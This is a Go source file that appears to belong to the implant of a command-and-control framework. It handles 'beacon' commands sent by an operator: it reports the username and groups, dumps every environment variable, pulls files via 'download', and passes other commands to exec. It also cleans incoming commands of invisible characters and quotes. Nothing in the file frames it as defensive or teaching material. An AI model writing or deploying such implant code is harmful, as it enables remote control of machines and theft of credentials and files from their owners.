package httpclient

import (
	"errors"
	"fmt"
	"os"
	"os/user"
	"sort"
	"strconv"
	"strings"
	"unicode"
)

// Built-in HTTP beacon commands (matched case-insensitively, whole string after trim — no extra args).
// These never use exec.Command or a shell: they use os/user and os.Environ() only (same idea as
// `whoami` / `groups` / `env` on Unix, or listing process environment on Windows — not subprocesses).

func builtinWhoami() (string, error) {
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("whoami: %w", err)
	}
	name := strings.TrimSpace(u.Username)
	if name == "" {
		return "", errors.New("whoami: empty username")
	}
	return name + "\n", nil
}

// builtinGroups lists group names for the current user via os/user (GroupIds + LookupGroupId).
func builtinGroups() (string, error) {
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("groups: %w", err)
	}
	gids, err := u.GroupIds()
	if err != nil {
		return "", fmt.Errorf("groups: %w", err)
	}
	names := make([]string, 0, len(gids))
	for _, gid := range gids {
		g, err := user.LookupGroupId(gid)
		if err != nil {
			names = append(names, gid)
			continue
		}
		if n := strings.TrimSpace(g.Name); n != "" {
			names = append(names, n)
		}
	}
	sort.Strings(names)
	return strings.Join(names, " ") + "\n", nil
}

// builtinEnvironment returns all environment variables as KEY=value lines (sorted), like `env` on Linux/macOS.
func builtinEnvironment() (string, error) {
	env := os.Environ()
	sort.Strings(env)
	return strings.Join(env, "\n") + "\n", nil
}

func stripInvisibleRunes(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		// Zero-width spaces and format chars break string equality but often collapse to one Fields() token.
		switch r {
		case '\u200b', '\u200c', '\u200d', '\ufeff':
			continue
		default:
			if unicode.Is(unicode.Cf, r) {
				continue
			}
			b.WriteRune(r)
		}
	}
	return b.String()
}

// stripSurroundingQuotes removes one or more layers of ASCII or common Unicode quotes around the
// whole token (e.g. C2/UI stores `"environment"` with literal quote characters).
func stripSurroundingQuotes(s string) string {
	s = strings.TrimSpace(s)
	for len(s) >= 2 {
		switch {
		case strings.HasPrefix(s, `"`) && strings.HasSuffix(s, `"`):
			if u, err := strconv.Unquote(s); err == nil {
				s = strings.TrimSpace(u)
				continue
			}
			s = strings.TrimSpace(s[1 : len(s)-1])
			continue
		case strings.HasPrefix(s, `'`) && strings.HasSuffix(s, `'`):
			s = strings.TrimSpace(s[1 : len(s)-1])
			continue
		case strings.HasPrefix(s, "\u201c") && strings.HasSuffix(s, "\u201d"):
			s = strings.TrimSpace(s[len("\u201c") : len(s)-len("\u201d")])
			continue
		case strings.HasPrefix(s, "\u2018") && strings.HasSuffix(s, "\u2019"):
			s = strings.TrimSpace(s[len("\u2018") : len(s)-len("\u2019")])
			continue
		default:
			return s
		}
	}
	return s
}

func normalizeBuiltinCommand(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(s, "\ufeff")
	s = stripInvisibleRunes(s)
	s = strings.TrimSpace(s)
	s = stripSurroundingQuotes(s)
	s = strings.ReplaceAll(s, "\x00", "")
	return strings.TrimSpace(s)
}

// runBuiltinHTTPCommand runs a built-in command when the token matches. If handled is false, use exec.
func runBuiltinHTTPCommand(command string) (output string, err error, handled bool) {
	s := normalizeBuiltinCommand(command)
	if s == "" {
		return "", nil, false
	}
	// download <path>  — path is everything after the first run of spaces after the verb.
	if verb, path, ok := splitVerbAndPath(s); ok {
		switch verb {
		case "download":
			if path == "" {
				return "", fmt.Errorf("download: missing path"), true
			}
			out, e := builtinHTTPDownload(path)
			return out, e, true
		case "upload":
			return "", fmt.Errorf("upload: use JSON command with path and content_base64 (see README)"), true
		default:
			// fall through to single-token / exec
		}
	}
	fields := strings.Fields(s)
	if len(fields) != 1 {
		return "", nil, false
	}
	switch strings.ToLower(fields[0]) {
	case "whoami":
		out, e := builtinWhoami()
		return out, e, true
	case "groups":
		out, e := builtinGroups()
		return out, e, true
	case "environment", "env":
		out, e := builtinEnvironment()
		return out, e, true
	default:
		return "", nil, false
	}
}
